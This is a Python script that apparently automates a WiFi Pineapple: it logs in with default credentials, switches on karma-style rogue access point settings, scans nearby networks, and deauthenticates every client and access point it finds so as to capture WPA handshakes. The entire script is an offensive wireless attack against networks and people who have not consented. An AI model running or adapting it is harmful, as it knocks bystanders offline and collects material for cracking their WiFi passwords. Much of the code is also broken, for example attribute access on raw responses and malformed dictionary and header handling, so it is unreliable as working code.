#!/usr/bin/env python3 

import json, requests, time
from pathlib import Path

def basic_wardriver_flow():
    s = requests.Session()
    auth = dict()
    auth["username"] = "root"
    auth["password"] = "password"
    
    authResp = s.post("http://172.16.42.1:1471/api/login", json.dumps(auth))
    if (authResp.token != None):
        s.headers.update({'Authorization: Bearer': authResp.token})
    reconStatusResp = s.get("http://172.16.42.1:1471/api/recon/status")
    if (reconStatusResp.scanRunning):
        reconStopResp = s.post("http://172.16.42.1:1471/api/recon/stop")
    pineAPSettings = dict()
    pineAPSettings["mode"] = 'advanced'
    pineAPSettings["settings"]["ap_channel"] = 11
    pineAPSettings["settings"]["autostart"] = True
    pineAPSettings["settings"]["autostartPAP"] = True
    pineAPSettings["settings"]["beacon_interval"] = 'AGGRESSIVE'
    pineAPSettings["settings"]["beacon_response_interval"] = 'AGGRESSIVE'
    pineAPSettings["settings"]["beacon_responses"] = True
    pineAPSettings["settings"]["broadcast_ssid_pool"] = False
    pineAPSettings["settings"]["capture_ssids"] = True
    pineAPSettings["settings"]["connect_notifications"] = False
    pineAPSettings["settings"]["disconnect_notifications"] = False
    pineAPSettings["settings"]["enablePineAP"] = True
    pineAPSettings["settings"]["karma"] = True
    pineAPSettings["settings"]["logging"] = True
    pineAPSettings["settings"]["pineap_mac"] = '5A:11:B0:A7:A9:09'
    pineAPSettings["settings"]["target_mac"] = 'FF:FF:FF:FF:FF:FF'
    
    setSettingsResp = s.post("http://172.16.42.1:1471/api/pineap/settings", json.dumps(pineAPSettings)) # might need data = json.
    
    if (setSettingsResp.success):
        reconScanOpts = dict()
        reconScanOpts["live"] = False
        reconScanOpts["scan_time"] = 90
        reconScanOpts["band"] = "0"
        startReconResponse = s.post("http://172.16.42.1:1471/api/recon/start", json.dumps(reconScanOpts))
    if (startReconResponse.scanID != None):
        time.sleep(90)
        reconStatusResponse = s.get("http://172.16.42.1:1471/api/recon/status")
        if (reconStatusResponse.scanRunning):
            s.post("http://172.16.42.1:1471/api/recon/stop")
        scanResp = s.get("http://172.16.42.1:1471/api/recon/scans/" + startReconResponse.scanID)
        if (scanResp.APResults.length > 0):
            for ap in scanResp.APResults:
                if (ap.clients != None):
                    clientDeauthPayload, bssidDeauthPayload, handshakePayload = dict()
                    clientArray = []
                    handshakePayload["bssid"] = ap.bssid
                    s.post("http://172.16.42.1:1471/api/pineap/handshakes/start")
                    for client in ap.clients:
                        clientDeauthPayload["bssid"] = client.ap_mac
                        clientDeauthPayload["mac"] = client.client_mac
                        clientDeauthPayload["multiplier"] = 5
                        clientDeauthPayload["channel"] = 11
                        s.post("http://172.16.42.1:1471/api/pineap/deauth/client", json.dumps(clientDeauthPayload))
                        clientArray.append(client.client_mac)
                    
                    bssidDeauthPayload["bssid"] = ap.bssid
                    bssidDeauthPayload["multiplier"] = 5
                    bssidDeauthPayload["channel"] = 11
                    bssidDeauthPayload["clients"] = clientArray
                    s.post("http://172.16.42.1:1471/api/pineap/deauth/ap", json.dumps(bssidDeauthPayload))
                    time.sleep(30)
                    s.post("http://172.16.42.1:1471/api/pineap/handshakes/stop")
                    handshakesResultResp = s.get("http://172.16.42.1:1471/api/pineap/handshakes")
                    if (handshakesResultResp.handshakes != None):
                        notificationPayload = dict()
                        notificationPayload["level"] = 2
                        notificationPayload["module_name"] = "wardriver"
                        for hs in handshakesResultResp.handshakes:
                            notificationString = "Found a handshake (" + hs.mac + ")!"
                            notificationPayload["message"] = notificationString
                            s.put("http://172.16.42.1:1471/api/notifications", json.dumps(notificationPayload))
                    else:
                        notificationString = "No handshakes captured :("
                        notificationPayload["message"] = notificationString
                        s.put("http://172.16.42.1:1471/api/notifications", json.dumps(notificationPayload))
